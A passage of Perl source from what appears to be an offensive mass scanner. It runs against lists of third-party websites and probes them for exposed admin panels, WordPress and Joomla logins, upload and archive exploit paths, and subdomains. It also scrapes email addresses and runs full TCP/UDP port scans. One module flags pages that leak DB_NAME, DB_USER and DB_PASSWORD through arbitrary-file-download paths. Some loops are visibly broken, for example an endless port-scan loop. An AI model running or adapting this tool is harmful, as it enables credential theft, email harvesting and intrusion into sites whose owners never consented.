      $URL1 = $URL.$ADFWP;
	  $URL1 =~ s/ //g;
      $yes = 'DB_NAME|DB_USER|DB_PASSWORD';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  checkedurl();
	  print "    [ ]...................................................................... \n";
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "adf".getlist()) {unlink "adf_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan.txt', "adf_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/adf_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn madmin
sub madmin {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  ADMIN();
 if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING ADMIN PAGE SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
    if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
	foreach $ADMIN(@ADMIN){
	  print color 'bold';
	  print "    EXPL:   ";
	  print color RESET;
      print "$ADMIN \n";
      $URL1 = $URL.$ADMIN;
	  $URL1 =~ s/ //g;
      $yes = 'password|username|email|Password|cPanel|admin';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  checkedurl();
	  print "    [ ]...................................................................... \n";
    }
    print "[ ] ----------------------------------------------------------------------- [ ]\n";
  }
  close(TEXT);
  if (-e "admin".getlist()) {unlink "admin_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan.txt', "admin_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/admin_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn msubdomain
sub msubdomain {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  SUBDOMAIN();
  if (!defined $mlevel) {
    targetlist();
  	scandetail();
  }
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING SUBDOMAIN SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://www.') != -1) {
	  $URL =~ s/http:\/\/www.//g;
	}
	if (index($URL, 'www.') != -1) {
	  $URL =~ s/www.//g;
	}
	$URL =~ s/\/.*//s;
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
	foreach $SUBDOMAIN(@SUBDOMAIN){
      $URL1 = $SUBDOMAIN.$URL;
	  $socket=IO::Socket::INET->new(
      PeerAddr=>"$URL1",
      Proto=>'icmp',
      timeout=>1);
	  
	  print color 'bold';
	  print "    EXPL:   ";
	  print color RESET;
      print "$SUBDOMAIN \n";
		
	  print color 'bold';
	  print "    INFO:   ";
	  print color RESET;
	  
	  if (defined $socket and $socket ne "") { 
	    print color 'green';
        print "http://$URL1\n";
	    print color RESET;
		open (INFO, '>>scan.txt');
        print INFO "http://$URL1\n";
        close (INFO);
	  }else{
	    print color 'red';
        print "Not a Subdomain! \n";
	    print color RESET;
	  }
	  close $socket if defined $socket;
	  print "    [ ]...................................................................... \n";
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "subdomains".getlist()) {unlink "subdomains_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan.txt', "subdomains_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/subdomains_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn mwpsites
sub mwpsites {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
	#scandetail();
  }
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING WORDPRESS SITES SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
	foreach $WPCMS(@WPCMS){
      $URL1 = $URL.$WPCMS;
	  $URL1 =~ s/ //g;
	  $cms="Wordpress!";
	  $yes = 'Username|Password|user_login|user_pass|submit|<meta name=\"generator\" content=\"WordPress';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  checkedurl();
      print "[ ]............................................................................ \n";
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "wp".getlist()) {unlink "wp_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan.txt', "wp_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/wp_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn mjoomsites
sub mjoomsites {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
	#scandetail();
  }
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING JOOLMA SITES SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
	foreach $JOOMCMS(@JOOMCMS){
      $URL1 = $URL.$JOOMCMS;
	  $URL1 =~ s/ //g;
	  $cms="Joomla!";
	  $yes = 'Joomla! Administration Login|Password|User Name|<meta name=\"generator\" content=\"Joomla! - Open Source Content Management|mod-login-password|mod-login-password';
      $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  checkedurl();
      print "[ ]............................................................................ \n";
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "joom".getlist()) {unlink "joom_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan.txt', "joom_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/joom_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn muploadsites
sub muploadsites {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  UPLOAD();
 if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING UPLOAD SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	$URL =~ s/=.*/=/s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
	foreach $UPLOAD(@UPLOAD){
	  print color 'bold';
	  print "    EXPL:   ";
	  print color RESET;
      print "$UPLOAD \n";
      $URL1 = $URL.$UPLOAD;
	  $URL1 =~ s/ //g;
	  $yes='a';
      $no = 'iikiiiix';
	  checkedurl();
	  print "    [ ]...................................................................... \n";
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "upload".getlist()) {unlink "upload_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan.txt', "upload_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/upload_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn mzipsites
sub mzipsites {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  ZIP();
 if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING ZIP SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	$URL =~ s/=.*/=/s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
	foreach $ZIP(@ZIP){
	  print color 'bold';
	  print "    EXPL:   ";
	  print color RESET;
      print "$ZIP \n";
      $URL1 = $URL.$ZIP;
	  $URL1 =~ s/ //g;
	  $yes='a';
      $no = 'iikiiiix';
	  checkedurl();
	  print "    [ ]...................................................................... \n";
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  if (-e "zip".getlist()) {unlink "zip_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan.txt', "zip_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/zip_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $command) && (!defined $mmails) && (!defined $mports)) {
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## bgn mmails
sub mmails {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  if (-e "scan2.txt") {unlink "scan2.txt";}
  testconection();
 if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING E-MAILS SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) {$URL = "http://$URL"; };	
	my $printarget = $URL;
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$printarget\n";
	print color RESET;
    $URL1 = $URL;
	$URL1 =~ s/ //g;
    $yes = '((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})';
    $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	$cmails='';
	checkedurl();
    print "[ ]............................................................................ \n";
  }
  print "[ ]............................................................................ \n";
  close(TEXT);
  if (-e "mails_".getlist()) {unlink "mails_".getlist();}
  if (-e 'scan.txt') {
    use File::Copy qw(copy);
    copy 'scan2.txt', "mails_".getlist();
	fincontinuemodule();
	print color 'green';
    print "[!] Results saved in $Bin/mails_".getlist()."!\n";
	print color RESET;
    subfin();
  }else{
	print color 'red';
    print "[!] No Results Found!\n";
    subfin();
  }
  if ((!defined $command) && (!defined $mports)) {
    exit();
    unlink 'scan2.txt';
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub mmd5 {
  scandetail();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING MD5 GENERATOR...\n";
  print "[ ]............................................................................ \n";
  print color RESET;
  forwait();
  print color 'bold';
  print "    STRING: ";
  print color RESET;
  print color 'blue';
  print "$mmd5\n";
  print color RESET;
  print color 'bold';
  print "    MD5:    ";
  print color RESET;
  print color 'green';
  print Digest::MD5->md5_hex("$mmd5");
  print "\n";
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub mencode64 {
  scandetail();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING ENCODE BASE64...\n";
  print "[ ]............................................................................ \n";
  print color RESET;
  forwait();
  print color 'bold';
  print "    STRING: ";
  print color RESET;
  print color 'blue';
  print "$mencode64\n";
  print color RESET;
  my $sss=encode_base64($mencode64);
  print color 'bold';
  print "    ENCODE: ";
  print color RESET;
  print color 'green';
  print "$sss\n";
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub mdecode64 {
  scandetail();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING DECODE BASE64...\n";
  print "[ ]............................................................................ \n";
  print color RESET;
  forwait();
  print color 'bold';
  print "    STRING: ";
  print color RESET;
  print color 'blue';
  print "$mdecode64\n";
  print color RESET;
  my $rrr=decode_base64($mdecode64);
  print color 'bold';
  print "    DECODE: ";
  print color RESET;
  print color 'green';
  print "$rrr\n";
  print color RESET;
}

############################################################################################################################################################################################
############################################################################################################################################################################################
sub resumeportscan {
  if (defined $mports) {
    print color 'bold';
    print "    INFO:   ";
    print color RESET;
    if (defined $mbasic) {
	  print "Basic Scan ";
    }
    if (defined $mall) {
      print "Complete Scan ";
    }
    if (defined $muser) {
      print "Select Scan ";
    }
	my $muser=$muser;
	my $mall=$mall;
	if ((defined $mbasic and $mbasic eq "udp") || (defined $mall and $mall eq "udp") || (defined $muser and $muser eq "udp")) {
	  print "UDP ";
	}
	if ((defined $mbasic and $mbasic eq "tcp") || (defined $mall and $mall eq "tcp") || (defined $muser and $muser eq "tcp")) {
	  print "TCP ";
	}
    if (((defined $mbasic and $mbasic eq "udp+tcp") || (defined $mall and $mall eq "udp+tcp") || (defined $muser and $muser eq "udp+tcp")) || ((defined $mbasic and $mbasic eq "tcp+udp") || (defined $mall and $mall eq "tcp+udp") || (defined $muser and $muser eq "tcp+udp"))) {
	  print "TCP + UDP";
	}
    if ((defined $mstart) && (defined $mend)) {
      print "[$mstart To $mend] ";
    }
    print "\n";
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub basic {
 if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS BASIC SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
	$URL = checkip($URL);
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$URL \n";
	print color RESET;
	resumeportscan();
	$URL=$URL;
    $type=$_[0];
    $closed1=0;
    @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
    foreach $port1(@PORTS){
      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port1",Proto=>"$type",Timeout=>"0.5") or $closed1++;
	  if (defined $socket) {
        close $socket;
	  }
	  print color 'bold';
      print "    TYPE:  ";
      print color RESET;
      print "$type  ";
	  print color 'bold';
      print "PORT:  ";
      print color RESET;
      print "$port1  ";
	  print color 'bold';
      print "INFO:  ";
      print color RESET;
      if ($closed1==0){
	    print color 'green';
        print "Open!\n";
		print color RESET;
      }else{
	    print color 'red';
        print "Closed!\n";
		print color RESET;
	  }
      $closed1=0;
    }
    print "[ ]............................................................................ \n";
  }
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub basic2 {
 if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS BASIC SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
	$URL = checkip($URL);
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$URL \n";
	print color RESET;
    resumeportscan();
	$URL=$URL;
    $closed2=0;
    $closed3=0;
    @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
    foreach $port2(@PORTS){
       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port2",Proto=>"tcp",Timeout=>"0.5") or $closed2++;
	   if (defined $socket) {
         close $socket;
         $closed2=0;
	    }
        $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port2",Proto=>"udp",Timeout=>"0.5") or $closed3++;
		if (defined $socket2) {
          close $socket2;
	    }	
	    if ($closed2==0){
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$port2  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$port2  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed! \n";
        print color RESET;
	  }
	  
      if ($closed3==0){
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$port2  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$port2  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed!\n";
        print color RESET;
	  }
	  $closed2=0;
      $closed3=0;
    }
    print "\n[ ]............................................................................ \n";
  }
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub complete {
  testconection();
  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS COMPLETE SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $type2=$_[0];
  $count=0;
  open (TEXT, 'search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
	$URL = checkip($URL);
	$closed3=0;
    $port3=1;
	print color 'bold magenta';
	timer();
	print "[$count/";
	countsearchlist();
	print "]\n";
	print color RESET;
	print color 'bold';
	print "[!] TARGET: ";
	print color RESET;
	print color 'blue';
	print "$URL \n";
	print color RESET;
    resumeportscan();
    while ($port3<=65535){
      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port3",Proto=>"$type2") or $closed3++;
	  if (defined $socket) {
        close $socket;
	  }
	  print color 'bold';
      print "    TYPE:  ";
      print color RESET;
      print "$type2  ";

	  print color 'bold';
      print "PORT:  ";
      print color RESET;
      print "$port3  ";
	  
	  print color 'bold';
      print "INFO:  ";
      print color RESET;
	  
      if ($closed3==0){
	    print color 'green';
        print "Open!\n";
		print color RESET;
      }else{
	    print color 'red';
        print "Closed!\n";
		print color RESET;
	  }
    }
	$closed3=0;
    $port3++;
  }
  print "[ ]............................................................................ \n";
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub complete2 {
  testconection();
  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS COMPLETE SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  $closed4=0;
  $closed5=0;
  $port4=1;
  while ($port4<=65535){
  open (TEXT, 'search.txt');
    while (my $URL = <TEXT>) {
      $count++;
	  chomp $URL;
	  $URL = checkip($URL);
	  print color 'bold magenta';
	  timer();
	  print "[$count/";
	  countsearchlist();
	  print "]\n";
	  print color RESET;
	  print color 'bold';
	  print "[!] TARGET: ";
	  print color RESET;
	  print color 'blue';
	  print "$URL \n";
	  print color RESET;
      resumeportscan();
      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port4",Proto=>"tcp") or $closed4++;
	  if (defined $socket) {
        close $socket;
	  }
	  $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port4",Proto=>"udp") or $closed5++;
	  if (defined $socket2) {
        close $socket2;
	  }
      if ($closed4==0){
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold';
        print "PORT:  ";

        print color RESET;
        print "$port4  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed!\n";
        print color RESET;
	  }
      if ($closed5==0){
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold';
        print "    TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed!\n";
        print color RESET;
	  }
    }
    $closed4=0;
    $closed5=0;
    $port4++;
    print "[ ]............................................................................ \n";
  }
  
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub subuser {
  if ((!defined $mstart) || (!defined $mend)) {
    print color 'yellow';
    print "[..][+] Type Start Of The Port : ";
    print color RESET;
    $mstart=<STDIN>;
    chomp($mstart);
    print color 'yellow';
    print "[..][+] Type End Of The Port : ";
    print color RESET;
    $mend=<STDIN>;
    chomp($mend);
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub user {
  testconection();
  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS SELECTIVE SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  if (defined $muser){
    $type3=$muser;
  }else{
    $type3=$_[0];
  }
  $count=0;
  $type3=$_[0];
  $closed6=0;
  while ($mstart<=$mend){
  open (TEXT, 'search.txt');
    while (my $URL = <TEXT>) {
      $count++;
	  chomp $URL;
	  $URL = checkip($URL);
	  print color 'bold magenta';
	  timer();
	  print "[$count/";
	  countsearchlist();
	  print "]\n";
	  print color RESET;
	  print color 'bold';
	  print "    [!] TARGET: ";
	  print color RESET;
	  print color 'blue';
	  print "$URL \n";
	  print color RESET;
      resumeportscan();
      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"$type3") or $closed6++;
      if (defined $socket) {
        close $socket;
	  }
	  print color 'bold';
      print "    TYPE:  ";
      print color RESET;
      print "$type3  ";

	  print color 'bold';
      print "PORT:  ";
      print color RESET;
      print "$mstart  ";
	  
	  print color 'bold';
      print "INFO:  ";
      print color RESET;
      if ($closed6==0){
	    print color 'green';
        print "Open!\n";
	    print color RESET;
	  }else{
		print color 'red';
        print "Closed!\n";
        print color RESET;
      }
    }
    $closed6=0;
    $mstart++;
    print "[ ]............................................................................ \n";
  }
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}

############################################################################################################################################################################################
############################################################################################################################################################################################
sub user2 {
  testconection();
  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
    targetlist();
  }
  searchexitstargets();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS SELECTIVE SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  forwait();
  $count=0;
  $closed7=0;
  $closed8=0;
  while ($mstart<=$mend){
  open (TEXT, 'search.txt');
    while (my $URL = <TEXT>) { ###
	  chomp $URL;
	  $URL = checkip($URL);
	  $count++;
  	  print color 'bold magenta';
	  timer();
	  print "[$count/";
	  countsearchlist();
	  print "]\n";
	  print color RESET;
	  print color 'bold';
	  print "[!] TARGET: ";
	  print color RESET;
	  print color 'blue';
	  print "$URL \n";
	  print color RESET;
      resumeportscan();
      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"tcp") or $closed7++;
	  if (defined $socket) {
        close $socket;
	  }
        $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"udp") or $closed8++;
	  if (defined $socket2) {
        close $socket2;
	  }
